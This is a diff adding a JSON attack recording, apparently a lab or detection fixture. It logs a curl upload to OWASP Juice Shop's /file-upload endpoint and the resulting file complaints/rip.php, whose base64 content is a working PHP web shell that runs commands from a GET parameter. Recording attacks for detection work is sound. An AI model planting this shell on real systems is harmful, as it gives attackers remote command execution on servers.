@@ -1,0 +1,15 @@
+{
+  "format": 1,
+  "move": "ATK-13",
+  "variant": "a",
+  "label": "loud: zipped PHP web shell through /file-upload, curl user agent",
+  "recordedAt": "2026-11-20T05:37:04.953Z",
+  "durationMs": 838,
+  "attackerIp": "203.0.113.131",
+  "juiceShop": "bkimminich/juice-shop:v20.4.0",
+  "tool": "curl 8.x",
+  "events": [
+    {"t":567,"kind":"access","ip":"203.0.113.131","method":"POST","target":"/file-upload","protocol":"HTTP/1.1","status":204,"bytes":0,"referer":"","userAgent":"curl/8.23.0","requestTimeMs":6},
+    {"t":567,"kind":"file","op":"add","path":"complaints/rip.php","size":52,"sha256":"7da9feca3e827dcee71ac3c2d744fb4bf0100fc6331fda5196f34c1c70028b69","contentBase64":"PD9waHAgaWYoaXNzZXQoJF9HRVRbImMiXSkpe3N5c3RlbSgkX0dFVFsiYyJdKTt9ID8+Cg=="}
+  ]
+}
